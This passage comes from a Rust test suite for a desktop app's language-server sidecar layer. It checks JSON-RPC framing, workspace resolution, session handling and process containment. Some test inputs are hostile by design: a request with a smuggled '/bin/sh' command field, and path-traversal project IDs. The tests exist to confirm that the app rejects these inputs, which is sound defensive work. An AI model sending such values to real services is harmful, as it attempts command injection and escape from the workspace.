            serde_json::from_value::<LanguageServiceSessionRequest>(json!({
                "session": "ls_00000000000000000000000000000001",
                "generation": 1,
                "workspaceRoot": "/tmp"
            }))
            .is_err()
        );
        assert!(serde_json::from_value::<SendLanguageServiceRequest>(json!({
            "session": "ls_00000000000000000000000000000001",
            "generation": 1,
            "message": {"jsonrpc": "2.0", "method": "initialized"},
            "command": "/bin/sh"
        }))
        .is_err());
        assert!(
            serde_json::from_value::<InstallLanguageServiceRequest>(json!({
                "kind": "texlab",
                "destination": "/tmp/texlab"
            }))
            .is_err()
        );
    }

    #[test]
    fn encoder_writes_one_canonical_content_length_header() {
        let value = request(7, "initialize");
        let body = serde_json::to_vec(&value).unwrap();
        let (encoded, message_bytes) = encode_json_rpc(&value).unwrap();
        assert_eq!(message_bytes, body.len());
        assert_eq!(
            encoded,
            [
                format!("Content-Length: {}\r\n\r\n", body.len()).as_bytes(),
                body.as_slice()
            ]
            .concat()
        );
    }

    #[test]
    fn decoder_accepts_every_chunk_boundary() {
        let value = request(1, "initialize");
        let encoded = frame(&value);
        for split in 0..=encoded.len() {
            let mut decoder = JsonRpcDecoder::default();
            let mut messages = decoder.push(&encoded[..split]).unwrap();
            messages.extend(decoder.push(&encoded[split..]).unwrap());
            decoder.finish().unwrap();
            assert_eq!(messages, vec![value.clone()], "split at {split}");
        }
    }

    #[test]
    fn decoder_accepts_multiple_frames_and_case_insensitive_headers() {
        let first = request(1, "initialize");
        let second = json!({"jsonrpc":"2.0","method":"initialized"});
        let second_body = serde_json::to_vec(&second).unwrap();
        let mut bytes = frame(&first);
        bytes.extend_from_slice(
            format!(
                "content-type: application/vscode-jsonrpc; charset=utf-8\r\ncOnTeNt-LeNgTh:\t{}\r\n\r\n",
                second_body.len()
            )
            .as_bytes(),
        );
        bytes.extend_from_slice(&second_body);
        let mut decoder = JsonRpcDecoder::default();
        assert_eq!(decoder.push(&bytes).unwrap(), vec![first, second]);
        decoder.finish().unwrap();
    }

    #[test]
    fn decoder_rejects_oversized_and_invalid_headers() {
        let oversized = format!("Content-Length: {}\r\n\r\n", MAX_MESSAGE_BYTES + 1);
        let error = JsonRpcDecoder::default()
            .push(oversized.as_bytes())
            .unwrap_err();
        assert_eq!(error.code, ProtocolErrorCode::MessageTooLarge);

        for (header, expected) in [
            (
                "Content-Type: application/json\r\n\r\n",
                ProtocolErrorCode::MissingContentLength,
            ),
            (
                "Content-Length: 2\r\nContent-Length: 2\r\n\r\n{}",
                ProtocolErrorCode::DuplicateContentLength,
            ),
            (
                "Content-Length: +2\r\n\r\n{}",
                ProtocolErrorCode::InvalidContentLength,
            ),
            ("Content-Length: 2\n\n{}", ProtocolErrorCode::InvalidHeader),
        ] {
            let error = JsonRpcDecoder::default()
                .push(header.as_bytes())
                .unwrap_err();
            assert_eq!(error.code, expected, "{header:?}");
        }

        let long_header = vec![b'a'; MAX_HEADER_BYTES + 1];
        let error = JsonRpcDecoder::default().push(&long_header).unwrap_err();
        assert_eq!(error.code, ProtocolErrorCode::HeaderTooLarge);

        let mut terminated_long_header = vec![b'a'; MAX_HEADER_BYTES + 1];
        terminated_long_header.extend_from_slice(b"\r\n\r\n");
        let error = JsonRpcDecoder::default()
            .push(&terminated_long_header)
            .unwrap_err();
        assert_eq!(error.code, ProtocolErrorCode::HeaderTooLarge);
    }

    #[test]
    fn decoder_rejects_invalid_json_utf8_and_json_rpc() {
        let invalid_json = b"Content-Length: 1\r\n\r\n{";
        assert_eq!(
            JsonRpcDecoder::default()
                .push(invalid_json)
                .unwrap_err()
                .code,
            ProtocolErrorCode::InvalidJson
        );

        let invalid_utf8 = b"Content-Length: 1\r\n\r\n\xff";
        assert_eq!(
            JsonRpcDecoder::default()
                .push(invalid_utf8)
                .unwrap_err()
                .code,
            ProtocolErrorCode::InvalidUtf8
        );

        let invalid_rpc_body = br#"{"method":"initialize"}"#;
        let mut invalid_rpc =
            format!("Content-Length: {}\r\n\r\n", invalid_rpc_body.len()).into_bytes();
        invalid_rpc.extend_from_slice(invalid_rpc_body);
        assert_eq!(
            JsonRpcDecoder::default()
                .push(&invalid_rpc)
                .unwrap_err()
                .code,
            ProtocolErrorCode::InvalidJsonRpc
        );
    }

    #[test]
    fn decoder_reports_partial_frame_at_eof() {
        let mut decoder = JsonRpcDecoder::default();
        decoder.push(b"Content-Length: 20\r\n\r\n{}").unwrap();
        assert_eq!(
            decoder.finish().unwrap_err().code,
            ProtocolErrorCode::UnexpectedEof
        );
    }

    #[test]
    fn outbound_validation_rejects_non_rpc_shapes() {
        for invalid in [
            json!(null),
            json!({"jsonrpc":"1.0","method":"x"}),
            json!({"jsonrpc":"2.0"}),
            json!({"jsonrpc":"2.0","id":1,"result":null,"error":{"code":1,"message":"x"}}),
            json!({"jsonrpc":"2.0","id":1.5,"method":"x"}),
            json!({"jsonrpc":"2.0","method":"x","params":"invalid"}),
            json!({"jsonrpc":"2.0","id":1,"error":{"code":"bad","message":"x"}}),
        ] {
            let error = encode_json_rpc(&invalid).unwrap_err();
            assert_eq!(error.code, LanguageServiceErrorCode::InvalidMessage);
        }
    }

    #[test]
    fn project_workspace_resolution_rejects_traversal_and_unknown_projects() {
        let _env_guard = paths::data_dir_env_lock();
        let previous_data_dir = std::env::var_os("OLEAFLY_DATA_DIR");
        let suffix = {
            let mut random = [0_u8; 8];
            OsRng.fill_bytes(&mut random);
            random
                .iter()
                .map(|byte| format!("{byte:02x}"))
                .collect::<String>()
        };
        let data_root = std::env::temp_dir().join(format!("oleafly-lsp-test-{suffix}"));
        fs::create_dir(&data_root).unwrap();
        std::env::set_var("OLEAFLY_DATA_DIR", &data_root);
        let projects = paths::projects_root().unwrap();
        let known = projects.join("known-project");
        fs::create_dir(&known).unwrap();
        fs::write(known.join("project.json"), b"{}").unwrap();
        assert_eq!(
            resolve_project_workspace("known-project").unwrap(),
            fs::canonicalize(&known).unwrap()
        );

        for invalid in ["", "..", "../known-project", "known/project", "/tmp"] {
            assert_eq!(
                resolve_project_workspace(invalid).unwrap_err().code,
                LanguageServiceErrorCode::InvalidWorkspace,
                "{invalid:?}"
            );
        }
        let secret_id = "private-token/../../known-project";
        let error = resolve_project_workspace(secret_id).unwrap_err();
        assert!(!error.message.contains(secret_id));
        assert_eq!(
            resolve_project_workspace(&"a".repeat(129))
                .unwrap_err()
                .code,
            LanguageServiceErrorCode::InvalidWorkspace
        );
        assert_eq!(
            resolve_project_workspace("unknown-project")
                .unwrap_err()
                .code,
            LanguageServiceErrorCode::InvalidWorkspace
        );
        assert!(!projects.join("unknown-project").exists());
        let corrupt = projects.join("corrupt-project");
        fs::create_dir(&corrupt).unwrap();
        fs::write(corrupt.join("project.json"), b"{not-json").unwrap();
        assert_eq!(
            resolve_project_workspace("corrupt-project")
                .unwrap_err()
                .code,
            LanguageServiceErrorCode::InvalidWorkspace
        );
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            let outside = data_root.join("outside");
            fs::create_dir(&outside).unwrap();
            fs::write(outside.join("project.json"), b"{}").unwrap();
            symlink(&outside, projects.join("linked-project")).unwrap();
            assert_eq!(
                resolve_project_workspace("linked-project")
                    .unwrap_err()
                    .code,
                LanguageServiceErrorCode::InvalidWorkspace
            );
        }

        if let Some(previous) = previous_data_dir {
            std::env::set_var("OLEAFLY_DATA_DIR", previous);
        } else {
            std::env::remove_var("OLEAFLY_DATA_DIR");
        }
        fs::remove_dir_all(data_root).unwrap();
    }

    #[test]
    fn admission_rejects_duplicate_exclusive_ownership_before_the_limit() {
        let roots: Vec<PathBuf> = (0..MAX_ACTIVE_SESSIONS)
            .map(|index| PathBuf::from(format!("/workspace/{index}")))
            .collect();
        assert_eq!(
            admission_decision(
                roots
                    .iter()
                    .map(|root| (LanguageServiceKind::TexLab, root.as_path())),
                LanguageServiceKind::TexLab,
                &roots[0],
                roots.len()
            ),
            Admission::Duplicate
        );
        assert_eq!(
            admission_decision(
                roots
                    .iter()
                    .map(|root| (LanguageServiceKind::TexLab, root.as_path())),
                LanguageServiceKind::Tinymist,
                Path::new("/workspace/new"),
                roots.len()
            ),
            Admission::AtCapacity
        );
        assert_eq!(
            admission_decision(
                roots[..1]
                    .iter()
                    .map(|root| (LanguageServiceKind::TexLab, root.as_path())),
                LanguageServiceKind::Tinymist,
                Path::new("/workspace/new"),
                1
            ),
            Admission::Available
        );
    }

    #[test]
    fn lifecycle_status_helpers_distinguish_terminal_states() {
        assert!(!LanguageServiceStatus::Running.is_terminal());
        assert!(!LanguageServiceStatus::Stopping.is_terminal());
        assert!(LanguageServiceStatus::Exited.is_terminal());
        assert!(LanguageServiceStatus::Stopped.is_terminal());
        assert!(LanguageServiceStatus::Failed.is_terminal());
    }

    #[test]
    fn every_event_serializes_the_full_session_identity() {
        let event = LanguageServiceEvent {
            session: "ls_00000000000000000000000000000001".into(),
            kind: LanguageServiceKind::TexLab,
            generation: 9,
            sequence: 3,
            payload: LanguageServiceEventPayload::Message {
                message: json!({"jsonrpc":"2.0","method":"window/logMessage"}),
            },
        };
        let serialized = serde_json::to_value(event).unwrap();
        assert_eq!(serialized["session"], "ls_00000000000000000000000000000001");
        assert_eq!(serialized["kind"], "texlab");
        assert_eq!(serialized["generation"], 9);
        assert_eq!(serialized["sequence"], 3);
        assert_eq!(serialized["event"], "message");
    }

    #[test]
    fn start_and_setup_error_serialization_match_the_ipc_contract() {
        let response = StartLanguageServiceResponse {
            session: "ls_00000000000000000000000000000001".into(),
            kind: LanguageServiceKind::TexLab,
            generation: 4,
            project_id: "project-a".into(),
            workspace_root: "/projects/project-a".into(),
            status: LanguageServiceStatus::Running,
        };
        let response = serde_json::to_value(response).unwrap();
        assert_eq!(response["projectId"], "project-a");
        assert_eq!(response["workspaceRoot"], "/projects/project-a");
        assert!(response.get("deduplicated").is_none());

        let error = LanguageServiceError::setup_required(
            LanguageServiceKind::TexLab,
            "5.26.0".into(),
            "install TexLab",
        );
        let error = serde_json::to_value(error).unwrap();
        assert_eq!(error["code"], "sidecar_setup_required");
        assert_eq!(error["kind"], "texlab");
        assert_eq!(error["version"], "5.26.0");

        let started = LanguageServiceEvent {
            session: "ls_00000000000000000000000000000001".into(),
            kind: LanguageServiceKind::TexLab,
            generation: 4,
            sequence: 1,
            payload: LanguageServiceEventPayload::Started {
                project_id: "project-a".into(),
                workspace_root: "/projects/project-a".into(),
            },
        };
        let started = serde_json::to_value(started).unwrap();
        assert_eq!(started["projectId"], "project-a");
        assert_eq!(started["workspaceRoot"], "/projects/project-a");
        assert!(started.get("project_id").is_none());
        assert!(started.get("workspace_root").is_none());

        let truncated = LanguageServiceEvent {
            session: "ls_00000000000000000000000000000001".into(),
            kind: LanguageServiceKind::TexLab,
            generation: 4,
            sequence: 2,
            payload: LanguageServiceEventPayload::StderrTruncated { limit_bytes: 4096 },
        };
        let truncated = serde_json::to_value(truncated).unwrap();
        assert_eq!(truncated["limitBytes"], 4096);
        assert!(truncated.get("limit_bytes").is_none());

        let exited = LanguageServiceEvent {
            session: "ls_00000000000000000000000000000001".into(),
            kind: LanguageServiceKind::TexLab,
            generation: 4,
            sequence: 3,
            payload: LanguageServiceEventPayload::Exited {
                status: LanguageServiceStatus::Failed,
                exit_code: Some(9),
                signal: None,
                reason: "fixture".into(),
            },
        };
        let exited = serde_json::to_value(exited).unwrap();
        assert_eq!(exited["exitCode"], 9);
        assert!(exited["signal"].is_null());
        assert!(exited.get("exit_code").is_none());
    }

    #[test]
    fn spawn_failures_do_not_expose_the_executable_path() {
        let secret_name = "private-token-in-executable-path";
        let executable = std::env::temp_dir().join(secret_name);
        let error = match spawn_sidecar(&executable, &[], Path::new(".")) {
            Ok(_) => panic!("nonexistent executable unexpectedly spawned"),
            Err(error) => error,
        };
        assert_eq!(error.code, LanguageServiceErrorCode::SidecarUnavailable);
        assert!(!error.message.contains(secret_name));
        assert!(!error.message.contains(&executable.display().to_string()));
    }

    #[cfg(windows)]
    #[tokio::test]
    async fn spawned_language_server_resumes_after_job_assignment() {
        let args = vec!["/D".into(), "/S".into(), "/C".into(), "exit 0".into()];
        let spawned = spawn_sidecar(Path::new("cmd.exe"), &args, Path::new("."))
            .expect("spawn contained language server");
        let SpawnedSession {
            mut child,
            stdin,
            stdout,
            stderr,
            containment,
            ..
        } = spawned;
        drop(stdin);
        drop(stdout);
        drop(stderr);
        let status = tokio::time::timeout(Duration::from_secs(10), child.wait())
            .await
            .expect("language server remained suspended")
            .expect("wait for language server");
        assert!(status.success());
        drop(containment);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn containment_drop_kills_a_helper_after_its_leader_exits() {
        fn process_is_running(pid: u32) -> bool {
            let output = std::process::Command::new("ps")
                .args(["-o", "stat=", "-p", &pid.to_string()])
                .output()
                .expect("inspect helper process");
            output.status.success()
                && String::from_utf8_lossy(&output.stdout)
                    .trim_start()
                    .chars()
                    .next()
                    .is_some_and(|state| state != 'Z')
        }

        let args = vec![
            "-c".into(),
            "sleep 30 </dev/null >/dev/null 2>/dev/null & printf '%s' \"$!\"".into(),
        ];
        let spawned =
            spawn_sidecar(Path::new("/bin/sh"), &args, Path::new(".")).expect("spawn shell leader");
        let SpawnedSession {
            mut child,
            stdin,
            mut stdout,
            stderr,
            containment,
            ..
        } = spawned;
        drop(stdin);
        drop(stderr);

        let mut output = Vec::new();
        stdout
            .read_to_end(&mut output)
            .await
            .expect("read helper pid");
        let helper_pid: u32 = String::from_utf8(output)
            .expect("ASCII helper pid")
            .parse()
            .expect("numeric helper pid");
        child.wait().await.expect("wait for shell leader");
        assert!(
            process_is_running(helper_pid),
            "fixture helper must outlive its leader before containment closes"
        );

        drop(containment);
        for _ in 0..50 {
            if !process_is_running(helper_pid) {
                return;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        panic!("contained helper process {helper_pid} survived containment closure");
    }

    #[test]
    fn failed_event_channel_is_detached_after_the_first_send_error() {
        let attempts = Arc::new(AtomicUsize::new(0));
        let attempts_for_channel = attempts.clone();
        let channel = Channel::new(move |_| {
            attempts_for_channel.fetch_add(1, Ordering::AcqRel);
            Err(tauri::Error::AssetNotFound("closed".into()))
        });
        let events = EventHub::new(
            SessionMeta {
                session: "ls_00000000000000000000000000000001".into(),
                kind: LanguageServiceKind::TexLab,
                generation: 1,
            },
            channel,
        );
        assert!(!events.emit(LanguageServiceEventPayload::Message {
            message: json!({"jsonrpc":"2.0","method":"first"}),
        }));
        assert!(!events.emit(LanguageServiceEventPayload::Message {
            message: json!({"jsonrpc":"2.0","method":"second"}),
        }));
        assert_eq!(attempts.load(Ordering::Acquire), 1);
    }

    #[test]
    fn terminal_session_history_is_bounded_and_generation_checked() {
        let registry = Registry::default();
        {
            let mut inner = lock_unpoisoned(&registry.inner);
            for index in 0..=MAX_TERMINAL_SESSIONS {
                retain_terminal_session(
                    &mut inner,
                    TerminalSession {
                        meta: SessionMeta {
                            session: format!("ls_{index:032x}"),
                            kind: LanguageServiceKind::Tinymist,
                            generation: index as u64 + 1,
                        },
                        project_id: format!("project-{index}"),
                        workspace_display: format!("/workspace/{index}"),
                        status: LanguageServiceStatus::Stopped,
                        exit_code: None,
                        signal: None,
                    },
                );
            }
            assert_eq!(inner.terminal.len(), MAX_TERMINAL_SESSIONS);
            assert_eq!(
                inner.terminal.front().unwrap().meta.session,
                "ls_00000000000000000000000000000001"
            );
        }

        let newest = format!("ls_{:032x}", MAX_TERMINAL_SESSIONS);
        assert!(matches!(
            lookup_session(&registry, &newest, MAX_TERMINAL_SESSIONS as u64 + 1).unwrap(),
            SessionLookup::Terminal(_)
        ));
        let mismatch = match lookup_session(&registry, &newest, 1) {
            Err(error) => error,
            Ok(_) => panic!("mismatched generation must be rejected"),
        };
        assert_eq!(mismatch.code, LanguageServiceErrorCode::GenerationMismatch);
        let evicted = match lookup_session(&registry, "ls_00000000000000000000000000000000", 1) {
            Err(error) => error,
            Ok(_) => panic!("old terminal session must be evicted"),
        };
        assert_eq!(evicted.code, LanguageServiceErrorCode::SessionNotFound);
    }

    #[test]
    fn outbound_queue_byte_reservation_is_bounded_and_released() {
        let queued = Arc::new(AtomicUsize::new(0));
        reserve_outbound_bytes(&queued, MAX_OUTBOUND_QUEUE_BYTES).unwrap();
        assert_eq!(
            reserve_outbound_bytes(&queued, 1).unwrap_err().code,
            LanguageServiceErrorCode::Backpressure
        );
        {
            let _frame = OutboundFrame {
                bytes: vec![0; MAX_OUTBOUND_QUEUE_BYTES],
                queued_bytes: queued.clone(),
            };
        }
        assert_eq!(queued.load(Ordering::Acquire), 0);
    }
}
